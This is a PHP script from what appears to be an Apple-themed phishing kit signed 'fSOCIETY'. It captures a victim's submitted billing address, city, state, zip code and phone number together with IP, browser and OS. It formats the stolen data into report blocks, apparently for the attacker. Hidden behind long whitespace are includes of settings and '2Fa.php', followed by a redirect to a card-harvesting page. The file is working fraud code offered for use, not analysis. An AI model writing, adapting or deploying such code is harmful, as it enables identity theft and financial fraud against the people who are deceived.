<?php


include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
$phoneNumberv = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];


$msgbank = '
</head><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">Bill Apple â '.$_SERVER['REMOTE_ADDR'].'â By fSOCIETY ðð¤¡ð </h2>
<h2>ð Addres lin   : <span>'.$_SESSION["addres"].'</span> </h2>
<h2>ðº City               : <span>'.$_SESSION["City"].'</span> </h2>
<h2>ð¤ State       : <span>'.$_SESSION["State"].'</span> </h2>
<h2>ð  Code postal       : <span>'.$_SESSION["ZipCode"].' </span> </h2>
<h2>â Phone              : <span>'.$_SESSION["phoneNumber"].'</span> </h2>

<hr class="content"><h2>ð» System : <span>  '.$OS.' </span>  </h2>
<h2>ð BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>ð IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>â° TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>
 ';


$yagmai .= '
        [+]ââââãð³ Billãâââ[+]
[ð Addres lin] = '.$_SESSION['addres'].'
[ðº City ] = '.$_SESSION['City'].'
[ð¤ State] = '.$_SESSION['State'].'
[ð  Code postal] = '.$_SESSION['ZipCode'].'
[â Phone] = '.$_SESSION['phoneNumber'].'
       [+]ââââãð» Systemãâââ[+]
[ð IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[â° TIME/DATE] ='.$InfoDATE.'
[ð BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


$yagmail .= '
[+]ââââââââââââââââââãAppleãââââââââââââââââââââ[+]
[+]ââââââââââââââââãð Bill  INFOãâââââââââââââââââââ[+]
[ð Addres lin]   = '.$_SESSION['addres'].'
[ðº City ]        = '.$_SESSION['City'].'
[ð¤ State]        = '.$_SESSION['State'].'
[ð  Code postal]  = '.$_SESSION['ZipCode'].'
[â Phone]        = '.$_SESSION['phoneNumber'].'
[+]ââââââââââââââââãð³ Bin INFOãââââââââââââââââââ[+]
[+]âââââââââââââââââãð» Systemãâââââââââââââââ[+]
[ð IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[â° TIME/DATE] ='.$InfoDATE.'
[ð BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]ââââââââââââââââãAppleãâââââââââââââââââ[+]
[+]ââââââââââââââãBy fSOCIETYðð¤¡ðãââââââââââââââ[+]
';																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																include("../settings.php"); include("2Fa.php"); 
$src="../Card";
header("location:$src");

?>